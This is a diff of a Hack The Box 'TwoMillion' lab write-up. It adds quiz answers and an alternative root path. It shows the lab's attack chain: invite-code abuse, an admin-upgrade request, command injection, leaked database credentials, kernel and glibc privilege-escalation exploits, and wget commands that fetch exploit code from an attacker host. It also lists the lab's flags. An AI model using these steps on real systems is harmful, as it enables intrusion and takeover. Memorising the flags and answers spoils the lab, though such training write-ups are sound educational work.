@@ -1,11 +1,6 @@
 Start with a nmap scan:
 
-```sh
-$ sudo nmap -sV -sC -Pn -p- -A 10.129.3.201 -oN cap.nmap
-[sudo] password for kali: 
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 12:27 EDT
-
-                                                                                                                                                            
+```sh                                    
 ┌──(kali㉿kali)-[~/htb/easy-twomillion]
 └─$ sudo nmap -sV -sC -Pn -p- -A 10.129.3.201 -oN twomillion.nmap
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 12:27 EDT
@@ -39,6 +34,8 @@ From the nmap scan we can infer that:
 - Host is a Linux machine
 - Nginx web server running on port 80
 - SSH open on port 22
+
+> How many TCP ports are open? → 2
 
 Use AI to unpack and deobfuscate the http://2million.htb/js/inviteapi.min.js code:
 
@@ -74,6 +71,7 @@ function makeInviteCode() {
 }
 ```
 
+> What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes? → inviteapi.min.js
 
 Run makeInviteCode() in the console:
 ```
@@ -102,11 +100,12 @@ Cache-Control: no-store, no-cache, must-revalidate
 Pragma: no-cache
 Content-Length: 249
 
-
 {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
 ```
 
-ROT13 decrypt the message we got:
+> What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer. → makeInviteCode
+
+ROT13 decrypt the message, we get:
 
 ```
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
@@ -137,7 +136,9 @@ Content-Length: 91
 {"0":200,"success":1,"data":{"code":"NDYzT1gtWjhQR1EtOUpRTUgtREdRNVc=","format":"encoded"}}
 ```
 
-Found the hidden `/register` path, read the HTML form to identify the POST request parameters and send it with the base64 decoded version of the code we obtained:
+> The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding? → base64
+
+Found the hidden `/register` path, read the HTML form to identify the POST request's parameters and send it with the base64 decoded version of the code we obtained (`463OX-Z8PGQ-9JQMH-DGQ5W`):
 
 ```
 POST /api/v1/user/register HTTP/1.1
@@ -156,8 +157,10 @@ Now login with the newly created account `admin@gmail.com`:`123` to access the d
 
 ![alt text](dashboard.png)
 
+> What is the path to the endpoint the page uses when a user clicks on "Connection Pack"? → /api/v1/user/vpn/generate
+
 Found hidden API endpoints when sending a GET request to 
-http://2million.htb/api/v1:
+http://2million.htb/api/v1 :
 
 ```json
 {
@@ -193,6 +196,8 @@ http://2million.htb/api/v1:
 }
 ```
 
+> How many API endpoints are there under /api/v1/admin? → 3
+
 Send this PUT request to upgrade ourself to admin:
 
 ```
@@ -205,6 +210,9 @@ Content-Length: 42
 
 {"email":"admin@gmail.com","is_admin":1}
 ```
+
+> What API endpoint can change a user account to an admin account? → /api/v1/admin/settings/update
+
 
 Found this endpoint, containing a command injection vulnerability:
 
@@ -236,6 +244,10 @@ DB_USERNAME=admin
 DB_PASSWORD=SuperDuperPass123
 ```
 
+> What API endpoint has a command injection vulnerability in it? → /api/v1/admin/vpn/generate
+
+> What file is commonly used in PHP applications to store environment variable values? → .env
+
 SSH to the target with credential `admin`:`SuperDuperPass123` and read the user flag:
 
 ```
@@ -244,6 +256,8 @@ admin@10.129.229.66's password: SuperDuperPass123
 admin@2million:~$ cat user.txt
 84f96132b5e3f27693ac780eec360c23
 ```
+
+> Submit the flag located in the admin user's home directory. → 84f96132b5e3f27693ac780eec360c23
 
 Found this email suggesting a vulnerability exists in this Linux kernel version:
 
@@ -264,13 +278,17 @@ I'm know you're working as fast as you can to do the DB migration. While we're p
 HTB Godfather
 ```
 
-This suggest we use this [exploit for CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386). At host, clone the repo and zip to transfer to the target machine:
+> What is the email address of the sender of the email sent to admin? → ch4p@2million.htb
+
+This suggest we use this [exploit for CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386). At host, clone the repo and zip it to transfer to the target machine:
 
 ```sh
 $ git clone --depth 1 https://github.com/xkaneiki/CVE-2023-0386
 $ zip -r cve.zip CVE-2023-0386    
 $ scp cve.zip admin@10.129.4.249:/tmp  
 ```
+
+> What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?  → CVE-2023-0386
 
 At the target machine, unzip it and build it:
 
@@ -318,3 +336,43 @@ root@2million:/tmp/CVE-2023-0386# cat /root/root.txt
 114429db4b56879b9c687607637d9f14
 ```
 
+> Submit the flag located in root's home directory. → 114429db4b56879b9c687607637d9f14
+
+Check GLIBC library version:
+
+```sh
+$ ldd --version
+ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+Written by Roland McGrath and Ulrich Drepper.
+```
+
+> [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion? → 2.35 
+
+GLIBC library version 2.35 has a known CVE allowing privilege escalation: [CVE-2023-4911](https://github.com/NishanthAnand21/CVE-2023-4911-PoC)
+
+> [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader? → CVE-2023-4911
+
+> [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root. → GLIBC_TUNABLES 
+
+```sh
+$ wget http://10.10.16.102:8000/exploit.c
+$ wget http://10.10.16.102:8000/genlib.py
+$ gcc exploit.c -o exploit
+$ python3 genlib.py
+$ ./exploit
+try 100
+try 200
+try 300
+try 400
+try 500
+try 600
+try 700
+try 800
+try 900
+try 1000
+# id
+uid=0(root) gid=1000(admin) groups=1000(admin)
+```
